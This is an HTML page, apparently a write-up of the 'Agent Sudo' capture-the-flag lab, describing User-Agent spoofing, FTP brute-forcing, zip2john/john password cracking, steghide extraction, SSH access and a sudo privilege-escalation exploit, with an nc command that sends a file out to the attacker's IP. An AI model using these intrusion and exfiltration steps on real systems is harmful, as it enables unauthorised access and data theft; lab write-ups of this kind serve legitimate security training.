@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <!-- basic -->
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <!-- mobile metas -->
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
+      <!-- site metas -->
+      <title>Agent Sudo</title>
+      <meta name="keywords" content="">
+      <meta name="description" content="">
+      <meta name="author" content="">
+      <!-- bootstrap css -->
+      <link rel="stylesheet" href="css/bootstrap.min.css">
+      <!-- style css -->
+      <link rel="stylesheet" href="css/style.css">
+      <!-- Responsive-->
+      <link rel="stylesheet" href="css/responsive.css">
+      <!-- fevicon -->
+      <link rel="icon" href="/machines/images/agentsudoimages/icon.png" type="image/gif" />
+      <!-- Scrollbar Custom CSS -->
+      <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
+      <!-- Tweaks for older IEs-->
+      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
+      
+   </head>
+   <!-- body -->
+   <body class="main-layout">
+      <!-- loader  -->
+      <div class="loader_bg">
+         <div class="loader"><img src="/machines/images/loading.gif" alt="#" /></div>
+      </div>
+      <!-- end loader -->
+      <!-- header -->
+      <header>
+         <!-- header inner -->
+         <div class="header">
+            <div class="container">
+               <div class="row">
+                  <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
+                     <div class="full">
+                        <div class="center-desk">
+                           <div class="logo">
+                              <a href="/index"><img src="/images/logo.PNG" alt="#" /></a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
+                     <nav class="navigation navbar navbar-expand-md navbar-dark ">
+                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div class="collapse navbar-collapse" id="navbarsExample04">
+                           <ul class="navbar-nav mr-auto">
+                              <li class="nav-item active">
+                                 <a class="nav-link" href="/index">Home</a>
+                              </li>
+                              <li class="nav-item">
+                                 <a class="nav-link" href="/machines"> Machines</a>
+                              </li>
+							  <li class="nav-item">
+                                 <a class="nav-link" href="/tools"> Tools</a>
+                              </li>
+                           </ul>
+                        </div>
+                     </nav>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </header>
+      <!-- end header inner -->
+      <!-- end header -->
+      <!-- Machine -->
+      <div class="hosting">
+         <div class="container">
+            <div class="row">
+               <div class="col-md-12">
+                  </div>
+               </div>
+            </div>
+            <div class>
+               <div class="col-md-12">
+                  <div class="web_hosting">
+				  <figure><img  src="/machines/images/agentsudoimages/0.png"/></figure>&nbsp;
+				  
+					 <h5>Nmap Output:</h5>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/1.png"/></figure>&nbsp;
+					 
+					 <h6>When we go to the website, we are told that we need to change the user-agent so that we can access the site. It says "C" on the tip.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/2.png"/></figure>&nbsp;
+					 
+					 <h6>We change the User-Agent value with burp as follows.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/3.png"/></figure>&nbsp;
+					 
+					 <h6>Done.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/4.png"/></figure>&nbsp;
+					 
+					 <h6>This message was sent to Chris. It was said that his password was too weak. Then we can brute-force it.</h6>&nbsp;
+					 <h6>We got the password when we did the brute-force for ftp.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/5.png"/></figure>&nbsp;
+					 
+					 <h6>Let's login to ftp.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/6.png"/></figure>&nbsp;
+					 
+					 <h6>When we log into ftp, 3 files greet us. Let's download all three.</h6>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/7.png"/></figure>&nbsp;
+					 
+					 <h6>The note says the pictures are fake.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/8.png"/></figure>&nbsp;
+					 
+					 <p>binwalk -e cutie.png </p>&nbsp;
+					 <h6>When we examine it, we see that there is a Zip file in the Cutie.png file.</h6>&nbsp;
+					 <h6>Let's open the zip file.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/9.png"/></figure>&nbsp;
+					 
+					 <h6>We extracted the zip file, but the file inside is encrypted.</h6>&nbsp;
+					 <h6>We can use john to crack the password.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/10.png"/></figure>&nbsp;
+					 
+					 
+					 <p>zip2john 8702.zip > name.zip</p>&nbsp;
+					 <p>john name.zip</p>&nbsp;
+					 <h6>With the commands, we see that the password is 'alien'.</h6>&nbsp;
+					 <h6>Now we can open the file.</h6>&nbsp;
+					 
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/11.png"/></figure>&nbsp;
+					 <h6>When we open the file, we see a hashed value. Let's crack the hash with base64.</h6>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/12.png"/></figure>&nbsp;
+					 
+					 <h6>We found the passphrase for the cute-alien.jpg file.</h6>&nbsp;
+					 <p>steghide extract -sf cute-alien.jpg</p>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/13.png"/></figure>&nbsp;
+					 
+					 
+					 <h6>Inside the file is a password that belongs to James.</h6>&nbsp;
+					 <h6>When we try to login with ftp it says the password is wrong.</h6>&nbsp;
+					 <h6>Then let's login to ssh.</h6>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/14.png"/></figure>&nbsp;
+					 
+					 
+					 <h6>We found the User Flag.</h6>&nbsp;
+					 <h6>There's also a picture. Let's get the image to our own machine.</h6>&nbsp;
+					 <p>nc -w 3 10.8.60.115 1234 < Alien_autopsy.jpg</p>&nbsp;
+					 <p>nc -lvnp 1234 > image.jpg</p>&nbsp;
+					 
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/15.png"/></figure>&nbsp;
+
+					 <h6>When we search the image with Google reverse image search, we find the answer to the question asked to us.</h6>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agentsudoimages/16.png"/></figure>&nbsp;
+					 
+					 <h5>Privilege Escalation</h5>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/17.png"/></figure>&nbsp;
+					 
+					 <h6>When we search for “(ALL, !root) /bin/bash” we find the CVE value.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/18.png"/></figure>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/19.png"/></figure>&nbsp;
+					 <h6>Let's exploit.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agentsudoimages/20.png"/></figure>&nbsp;
+					 <h6>The answer to the bonus question is also written under the flag. "DesKel"</h6>&nbsp;
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- end Machine -->
+
+      <!-- Javascript files-->
+      <script src="js/jquery.min.js"></script>
+      <script src="js/popper.min.js"></script>
+      <script src="js/bootstrap.bundle.min.js"></script>
+      <script src="js/jquery-3.0.0.min.js"></script>
+      <script src="js/plugin.js"></script>
+      <!-- sidebar -->
+      <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
+      <script src="js/custom.js"></script>
+      <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
+   </body>
+</html>
